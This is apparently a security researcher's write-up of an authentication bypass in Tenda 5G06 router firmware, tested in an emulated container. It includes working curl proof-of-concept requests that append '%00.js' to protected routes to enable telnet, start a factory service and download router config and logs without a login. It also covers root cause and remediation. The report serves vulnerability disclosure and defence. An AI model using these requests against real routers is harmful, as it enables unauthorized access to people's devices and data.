# Tenda 5G06 Auth Deep Dive

Date: 2026-04-22

Target image:

```text
795453735379013_US_5G06V1.0mt_V05.06.01.29_multi_TDE01.zip
```

Runtime under test:

```text
container: tenda-b104-native-httpd
web UI:    http://127.0.0.1:18080/
native:    /usr/sbin/httpd under qemu-aarch64
```

## Conclusion

Auth can be bypassed.

The working primitive is a percent-encoded NUL followed by a static-file
extension:

```text
/<protected-route>%00.js
/<protected-route>%00.css
/<protected-route>%00.png
```

The auth gate treats these as static resources and skips login enforcement. The
later dispatcher resolves the same request as the NUL-truncated protected route
and calls the native handler.

Confirmed unauthenticated impact:

- `GET /goform/telnet%00.js` starts `telnetd` and opens TCP/23.
- `GET /goform/ate%00.js` starts `td_ate` and opens UDP/7329.
- `GET /cgi-bin/DownloadCfg%00.js` downloads the protected router config.
- `GET /cgi-bin/DownloadLog%00.js` downloads the protected log archive.
- `POST /goform/setModules%00.js` reaches the broad write API instead of
  returning auth-expired.

This was reproduced against native `httpd` both through the local proxy and
from inside the Docker container directly. It is not a proxy-only artifact.

## Auth Design

`httpd` has a central request/router/auth function at:

```text
httpd:0x418378
```

The login route expects JSON:

```http
POST /login/Auth
Content-Type: application/json; charset=UTF-8

{"username":"admin","password":"<md5(login password)>"}
```

The UI computes MD5 client-side in `www/js/login.js`:

```text
password: this.$md5(this.loginPwd.val)
```

The configured runtime password after quickset was:

```text
Tenda_888888
md5: fbcd4667f4d4f5d27f4b1250fc051126
```

The active rootfs config had:

```text
option quickset_cfg '0'
option username 'admin'
option userpass 'fbcd4667f4d4f5d27f4b1250fc051126'
```

The factory/rootfs default `etc/config/pub` had an empty login password:

```text
option quickset_cfg '1'
option username 'admin'
option userpass ''
```

This matters because the auth/router code has additional first-run branches,
but the confirmed bypass below works even after a login password is configured.

## Session And Cookie Behavior

The session cookie is emitted as:

```text
Set-Cookie: password=%s; path=/
```

There are no `HttpOnly`, `Secure`, or `SameSite` attributes.

The router builds an expected cookie value from the configured password hash
plus per-client/session suffix state. When a cookie prefix matches, it calls:

```text
httpd:0x417e68  check_CSRF_attack
```

That CSRF check is weak:

- missing `Referer` returns success,
- missing `Host` returns success,
- same-host referers return success,
- only some cross-host referer/path combinations fail.

The NUL suffix auth bypass is stronger than the CSRF weakness because it does
not require a valid cookie.

## Root Cause

The auth/router function checks static-resource extensions before enforcing
login on dynamic handlers.

Relevant behavior from `httpd:0x418378`:

- copies the request URL into a stack buffer,
- strips query at `?`,
- bypasses auth for static prefixes such as `/public/` and `/lang/`,
- bypasses auth for file extensions `.gif`, `.png`, `.js`, `.css`, and `jpeg`,
- only after that checks protected routes such as `/goform/telnet`,
  `/goform/ate`, and `/goform/zerotier`.

The dispatcher then uses C-string parsing on the route. The goform dispatcher at
`httpd:0x409b40`:

- copies the route with `strncpy`,
- finds the form name after `/goform/`,
- terminates the form name at the next `/`,
- looks up that form name and calls the registered handler.

For a request like:

```text
/goform/telnet%00.js
```

the auth gate sees a URL ending in `.js` and skips auth. The route dispatcher
then sees the decoded C string:

```text
/goform/telnet\0.js
```

and resolves the form name as:

```text
telnet
```

The same mismatch affects CGI routes. The dispatcher compares protected CGI
paths with prefix checks, so:

```text
/cgi-bin/DownloadCfg\0.js
```

matches `/cgi-bin/DownloadCfg` after the auth gate has already skipped login
because of the `.js` suffix.

## Live Evidence

Baseline unauthenticated requests are protected:

```text
GET /goform/telnet
-> 302 Location: /login.html

GET /cgi-bin/DownloadCfg
-> 302 Location: /login.html

GET /goform/getModules?modules=systemStatus
-> 200 {"errCode":1000}
```

The NUL suffix bypass reaches handlers:

```text
curl -i -s --path-as-is \
  http://127.0.0.1:18080/goform/telnet%00.js
```

Proxy response:

```text
HTTP/1.1 502 Bad Gateway
{"errCode": 1, "error": "proxy upstream error"}
```

Native side effect:

```text
telnetd
tcp LISTEN *:23
```

The proxy reports 502 because the native hidden handler writes a bare status
body such as `load telnetd success.` rather than a normal HTTP response. The
process side effect confirms handler execution.

ATE bypass:

```text
curl -i -s --path-as-is \
  http://127.0.0.1:18080/goform/ate%00.js
```

Native side effect:

```text
td_ate
udp UNCONN 0.0.0.0:7329
```

Config download bypass:

```text
curl -i -s --path-as-is --max-time 3 \
  -o /tmp/tenda_noauth_cfg.bin \
  -w '%{http_code} %{size_download} %{content_type}\n' \
  http://127.0.0.1:18080/cgi-bin/DownloadCfg%00.js
```

Result:

```text
200 16720 config/conf
```

Log download bypass:

```text
curl -i -s --path-as-is --max-time 3 \
  -o /tmp/tenda_noauth_log.bin \
  -w '%{http_code} %{size_download} %{content_type}\n' \
  http://127.0.0.1:18080/cgi-bin/DownloadLog%00.js
```

Result:

```text
200 308224 config/conf
```

Broad write API reachability:

```text
curl -i -s --path-as-is \
  -H 'Content-Type: application/json; charset=UTF-8' \
  --data '{"noSuchModule":"x"}' \
  http://127.0.0.1:18080/goform/setModules
```

Result:

```text
200 {"errCode":1000}
```

With the bypass:

```text
curl -i -s --path-as-is \
  -H 'Content-Type: application/json; charset=UTF-8' \
  --data '{"noSuchModule":"x"}' \
  http://127.0.0.1:18080/goform/setModules%00.js
```

Result:

```text
200 {"errCode":""}
```

This test used an invalid module name to avoid intentionally changing device
state. It confirms the request reaches the native write route without a
session.

## Negative Controls

These did not execute the protected handlers:

```text
GET /goform/telnet
-> 302 /login.html

GET /goform/telnet%00
-> 302 /login.html

GET /goform/telnet%2ejs
-> 302 /login.html

GET /goform/ate.js
-> 200 "Form ate.js is not defined"

GET /public/../goform/telnet
-> 400 Bad HTTP request

GET /lang/../goform/ate
-> 400 Bad HTTP request
```

So the reliable primitive is encoded NUL plus one of the auth-bypassed static
extensions.

## Affected Surface

Confirmed affected:

- `/goform/telnet`
- `/goform/ate`
- `/goform/zerotier`
- `/goform/getModules`
- `/goform/setModules`
- `/cgi-bin/DownloadCfg`
- `/cgi-bin/DownloadLog`

Very likely affected by the same auth gate, but not destructively tested:

- `/cgi-bin/upgrade`
- `/cgi-bin/UploadCfg`
- `/cgi-bin/uploadApnList`
- `/cgi-bin/Uploadclient_ovpn`
- `/cgi-bin/Uploadca_file`
- `/cgi-bin/UploadWireGuardClientCfg`
- `/cgi-bin/exportCapture`
- `/cgi-bin/DownloadSyslog`
- other registered `/goform/*` handlers reached through the same dispatcher.

The upload and upgrade paths were not exercised with attacker-controlled files
because that would alter the emulated device state. Static analysis from the
earlier deep dive showed those handlers write to privileged fixed paths and
then hand data to config, VPN, APN, and firmware parsers.

## Severity

Critical.

An unauthenticated LAN-side or web-exposed attacker can invoke protected
management handlers by appending `%00.js` or another whitelisted static suffix.
The observed impact includes enabling telnet, enabling a manufacturing UDP
service, downloading config/log archives, and reaching the broad settings write
API.

If remote administration is enabled or the web UI is otherwise reachable from
an untrusted network, the same primitive becomes remotely exploitable.

## Remediation

Minimum fixes:

- Reject any URL containing percent-encoded NUL, decoded NUL, or control
  characters before auth and dispatch.
- Decode and normalize the URL once, then use that same canonical path for both
  auth decisions and handler dispatch.
- Do not bypass auth based only on a suffix. Static files should be served only
  after resolving to an allowed file under an allowed static directory.
- Enforce authorization inside each sensitive handler as a defense-in-depth
  check, especially `/goform/telnet`, `/goform/ate`, upload, upgrade, config
  backup/restore, and broad module write routes.
- Add `HttpOnly`, `Secure`, and `SameSite` cookie attributes where appropriate.
- Replace permissive referer-based CSRF checks with per-session CSRF tokens for
  state-changing routes.

